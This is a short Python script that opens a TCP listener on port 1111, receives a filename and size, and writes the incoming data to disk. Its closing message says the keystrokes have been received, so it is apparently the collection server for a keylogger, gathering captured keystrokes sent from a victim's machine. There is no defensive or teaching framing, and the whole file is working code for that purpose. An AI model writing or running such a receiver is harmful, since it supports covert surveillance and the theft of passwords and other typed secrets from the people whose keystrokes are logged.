import socket
import os

SERVER_HOST = "0.0.0.0" # change this
SERVER_PORT = 1111 # change this 
BUFFER_SIZE = 4096 # change this

s = socket.socket()
s.bind((SERVER_HOST,SERVER_PORT))

s.listen(5) # maximum connection try
print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT}")

# accept connection if there is any
client_socket, address = s.accept() 
print(f"[+] {address} is connected.")

# receive the file infos using client socket
received = client_socket.recv(BUFFER_SIZE).decode()
filename, filesize = received.split(" ")
# remove absolute path if there is
filename = os.path.basename(filename)
# convert filesize to integer
filesize = int(filesize)

# start receiving the data from the socket and writing to the file 
with open(filename, "w") as f:
    while True:
        # receive bytes from the socket
        content = client_socket.recv(BUFFER_SIZE).decode()
        if not content:    
        # file transmitting is done
            break
        # write to file received file
        f.write(content)
        
print("[!] The key strokes are received.")
print("[+] Closing the socket ...")
# close the client socket
client_socket.close()
# close the server socket
s.close()